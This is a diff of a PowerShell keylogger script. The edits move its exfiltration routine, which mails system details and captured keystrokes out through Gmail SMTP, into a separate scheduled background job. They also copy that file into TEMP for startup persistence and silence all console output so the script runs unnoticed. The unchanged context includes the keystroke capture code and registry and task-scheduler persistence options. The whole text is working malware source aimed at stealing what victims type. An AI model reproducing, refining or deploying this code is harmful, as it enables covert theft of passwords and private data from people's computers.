@@ -5,34 +5,10 @@ Param (
 	[string]$Type = "Startup"
 )
 
-$Email = "email@email.com"
-$Password = "MyPassword"
-
 
 $validPersistanceTypes = "Startup", "TaskScheduler", "Registry", "All"
+$sendMailPath = "$PWD\sendMail.ps1";
 
-function sendMail($logFile="$env:temp\$env:username.log") {
-	
-    $Subject = "You got mail from $env:USERNAME!"
-    $Body = @"
-                This email has been sent from $env:COMPUTERNAME
-                -----------------------------------------------------------------
-                Computer Name: $env:computername
-                User Name: $env:username
-                Home Directory: $env:userprofile
-                Operating System: $env:OS
-                Processor: $env:PROCESSOR_ARCHITECTURE $env:PROCESSOR_IDENTIFIER
-
-"@
-    if (Test-Path $logFile) {
-        $Body += Get-Content -Path $logFile -Raw
-    }
-    $SMTPServer = "smtp.gmail.com"
-    $SMTPClient = New-Object Net.Mail.SMTPClient($SMTPServer, 587)
-    $SMTPClient.EnableSSL = $true
-    $SMTPClient.Credentials = New-Object System.Net.NetworkCredential($Email, $Password)
-    $SMTPClient.Send($Email, $Email, $Subject, $Body)
-}
 function Check-DotNetFramework {
     $dotNetKey = 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full'
     $dotNetVersion = $null
@@ -44,7 +20,7 @@ function Check-DotNetFramework {
 
     # .NET Framework 4.0 and later versions have a release value >= 379893
     if ($dotNetVersion -ge 379893) {
-		Write-Host ".NET Version: $dotNetVersion"
+		#Write-Host ".NET Version: $dotNetVersion"
         return $true
     }
     
@@ -53,10 +29,10 @@ function Check-DotNetFramework {
 
 function KeyLog {
 	if (Check-DotNetFramework) {
-		Write-Output ".NET Framework is present."
+		#Write-Host ".NET Framework is present."
 		ComplexKeyLog
 	} else {
-		Write-Output ".NET Framework is not present."
+		#Write-Host ".NET Framework is not present."
 		SimpleKeyLog
 	}
 }
@@ -96,7 +72,7 @@ namespace KeyLogger {
     public static void Main(string[] args) {
 	  if (args.Length > 0) {
 		string logFileName = args[0];
-		Console.WriteLine("Writing keys to " + logFileName);
+		// Console.WriteLine("Writing keys to " + logFileName);
 	  	logFile = File.AppendText(logFileName);
       	logFile.AutoFlush = true;
 
@@ -285,6 +261,7 @@ Add-Type -TypeDefinition $source -ReferencedAssemblies System.Windows.Forms
 $logFileName = "$env:temp\$env:username.log"
 [KeyLogger.Program]::Main($logFileName);
 }
+
 function SimpleKeyLog($LogFile="$env:temp\$env:username.log") {
 	$LootFile = New-Item -Path $LogFile -ItemType File -Force
 
@@ -332,24 +309,12 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 		}
 	} 
 	catch {
-		Write-Error "An error occured: $_"
+		#Write-Error "An error occured: $_"
 	}	
 	finally {
-		Write-Output "Finally reached: $_"
-		sendMail
+		#Write-Host "Finally reached: $_"
+		SendMail
 	}
-}
-
-function ScheduleMail($MinutesInterval=60) {
-        $now = Get-Date
-        $SecondsInterval = $MinutesInterval * 60
-        $nextInterval = $now.AddMinutes($MinutesInterval - ($now.Minute % $MinutesInterval))
-		$timeLeft = ($nextInterval - $now).TotalSeconds
-        Start-Sleep -Seconds $timeLeft
-        while ($true) {
-            sendMail
-            Start-Sleep -Seconds $SecondsInterval
-        }
 }
 
 function persistStartup() {
@@ -363,6 +328,12 @@ function persistStartup() {
 	$scriptPath = "$PWD\$script"
 	$scriptDestinationPath = "$env:TEMP\$script"	
 	Copy-Item -Path $scriptPath -Destination $scriptDestinationPath -Force
+	
+	$scheduler = "sendMail.ps1"
+	$schedulerPath = "$PWD\$scheduler"
+	$schedulerDestinationPath = "$env:TEMP\$scheduler"	
+	Copy-Item -Path $schedulerPath -Destination $schedulerDestinationPath -Force
+	
 }
 
 function persistTaskScheduler() {
@@ -386,7 +357,7 @@ function CreatePersistance($Type) {
 			
 		"Startup" {
 			# Place your specific logic for Startup here
-			Write-Output "[DEBUG][Persistance] Persisting startup."
+			#Write-Host "[DEBUG][Persistance] Persisting startup."
 			persistStartup
 		}
 		"TaskScheduler" {
@@ -402,14 +373,20 @@ function CreatePersistance($Type) {
 			persistAll
 		}
 		default {
-			Write-Output "Unknown option selected."
+			#Write-Host "Unknown option selected."
 		}
 	}
 	
 	
 }
 
-sendMail
+Start-Job -ScriptBlock {
+	. $using:sendMailPath
+	SendMail
+	ScheduleMail -MinutesInterval $Interval
+	} -InitializationScript { 
+				$ProgressPreference = 'SilentlyContinue'; 
+				} | Out-Null
+
 CreatePersistance -Type $Type
 KeyLog
-ScheduleMail -MinutesInterval 60
